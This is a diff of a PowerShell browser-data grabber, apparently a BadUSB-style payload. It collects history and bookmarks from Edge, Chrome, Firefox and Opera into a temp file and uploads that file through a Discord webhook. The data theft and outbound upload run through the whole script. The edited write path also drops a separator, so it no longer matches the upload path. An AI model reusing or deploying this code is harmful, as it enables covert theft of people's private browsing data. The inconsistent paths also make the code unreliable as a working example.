@@ -49,22 +49,21 @@ function Get-BrowserData {
 
 $BrowserDataPath = "$env:TMP/--BrowserData.txt"
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $BrowserDataPath
+Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $BrowserDataPath
+Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $BrowserDataPath
+Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $BrowserDataPath
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $BrowserDataPath
+Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $BrowserDataPath
+Get-BrowserData -Browser "opera" -DataType "history" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $BrowserDataPath
+Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -FilePath "$env:TMP--BrowserData.txt" -Append
 
 function Upload-Discord {
-
     [CmdletBinding()]
     param (
         [parameter(Position=0,Mandatory=$False)]
@@ -95,5 +94,5 @@ function Upload-Discord {
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){
-Upload-Discord -file $BrowserDataPath -text "Browser data"
-}   
+Upload-Discord -file "$env:TMP/--BrowserData.txt" -text "Browser data"
+}    
